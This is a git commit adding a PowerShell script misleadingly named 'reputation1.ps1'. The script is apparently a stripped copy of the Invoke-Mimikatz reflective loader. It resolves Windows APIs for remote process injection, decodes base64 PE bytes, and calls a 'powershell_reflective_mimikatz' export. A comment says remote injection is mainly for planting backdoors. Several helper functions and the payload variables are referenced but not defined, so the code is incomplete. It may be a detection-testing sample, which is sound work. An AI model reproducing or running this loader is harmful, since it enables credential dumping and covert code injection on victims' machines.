6ed0af2a4738866573beb7b1e059a815df5d6c73
Schnidrig, Matias <Matias_Schnidrig@McAfee.com>
2018-08-26 19:45:50 -0300

    Adding reputation1.ps1

---
+++ reputation1.ps1
@@ -0,0 +1,350 @@
+function Invoke-Mim
+{
+
+
+Set-StrictMode -Version 2
+
+
+$RemoteScriptBlock = {
+	
+	
+	###################################
+	##########  Win32 Stuff  ##########
+	###################################
+
+
+	Function Get-Win32Functions
+	{
+		$Win32Functions = New-Object System.Object
+		
+		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
+		
+		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
+		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
+		
+		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
+		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
+		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
+		
+		$memsetAddr = Get-ProcAddress msvcrt.dll memset
+		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
+		
+		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
+		
+		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
+		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
+		
+		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
+		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
+		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
+		
+		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
+		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
+		
+		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
+		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
+		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
+		
+		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
+		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
+		
+		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
+		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
+		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
+		
+		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
+		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
+		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
+		
+		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
+	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
+		
+		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
+	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
+		
+		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
+        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+		
+		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
+        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
+		
+		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
+        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
+		
+		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
+        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
+        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
+		
+		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
+        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
+        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
+		
+		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
+        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
+        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
+		
+		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
+        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
+        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
+		
+		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
+        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
+        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
+		
+		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
+        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
+        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
+		
+        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
+        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
+		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
+            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
+            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
+		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
+        }
+		
+		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
+        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
+        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
+		
+		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
+        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
+        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
+	
+		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
+		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree
+
+		return $Win32Functions
+	}
+	#####################################
+
+
+	#####################################
+	##########    FUNCTIONS   ###########
+	#####################################
+	
+
+	Function Main
+	{
+		$Win32Functions = Get-Win32Functions
+		$Win32Types = Get-Win32Types
+		$Win32Constants =  Get-Win32Constants
+		
+		$RemoteProcHandle = [IntPtr]::Zero
+	
+		#If a remote process to inject in to is specified, get a handle to it
+		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
+		{
+			Throw "Can't supply a ProcId and ProcName, choose one or the other"
+		}
+		elseif ($ProcName -ne $null -and $ProcName -ne "")
+		{
+			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
+			if ($Processes.Count -eq 0)
+			{
+				Throw "Can't find process $ProcName"
+			}
+			elseif ($Processes.Count -gt 1)
+			{
+				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
+				Write-Output $ProcInfo
+				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
+			}
+			else
+			{
+				$ProcId = $Processes[0].ID
+			}
+		}
+		
+		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
+		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
+#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
+#		{
+#			Write-Verbose "Getting SeDebugPrivilege"
+#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
+#		}	
+		
+		if (($ProcId -ne $null) -and ($ProcId -ne 0))
+		{
+			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
+			if ($RemoteProcHandle -eq [IntPtr]::Zero)
+			{
+				Throw "Couldn't obtain the handle for process ID: $ProcId"
+			}
+			
+			Write-Verbose "Got the handle for the remote process to inject in to"
+		}
+		
+
+		#Load the PE reflectively
+		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
+
+        try
+        {
+            $Processors = Get-WmiObject -Class Win32_Processor
+        }
+        catch
+        {
+            throw ($_.Exception)
+        }
+
+        if ($Processors -is [array])
+        {
+            $Processor = $Processors[0]
+        } else {
+            $Processor = $Processors
+        }
+
+        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
+        {
+            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
+            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
+        }
+
+        #Determine whether or not to use 32bit or 64bit bytes
+        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
+        }
+        else
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
+        }
+        $PEBytes[0] = 0
+        $PEBytes[1] = 0
+		$PEHandle = [IntPtr]::Zero
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+		}
+		else
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
+		}
+		if ($PELoadedInfo -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to load PE, handle returned is NULL"
+		}
+		
+		$PEHandle = $PELoadedInfo[0]
+		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+		
+		
+		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
+		{
+			#########################################
+			### YOUR CODE GOES HERE
+			#########################################
+                    Write-Verbose "Calling function with WString return type"
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
+				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw "Couldn't find function address."
+				    }
+				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
+				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
+                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
+				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
+				    if ($OutputPtr -eq [IntPtr]::Zero)
+				    {
+				    	Throw "Unable to get output, Output Ptr is NULL"
+				    }
+				    else
+				    {
+				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
+				        Write-Output $Output
+				        $Win32Functions.LocalFree.Invoke($OutputPtr);
+				    }
+			#########################################
+			### END OF YOUR CODE
+			#########################################
+		}
+		#For remote DLL injection, call a void function which takes no parameters
+		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
+			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
+			{
+				Throw "VoidFunc couldn't be found in the DLL"
+			}
+			
+			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
+			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
+			
+			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+		}
+		
+		#Don't free a library if it is injected in a remote process
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+		}
+		else
+		{
+			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
+			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+			if ($Success -eq $false)
+			{
+				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
+			}
+		}
+		
+		Write-Verbose "Done!"
+	}
+
+	Main
+}
+
+#Main function to either run the script locally or remotely
+Function Main
+{
+	
+}
+
+Main
+}
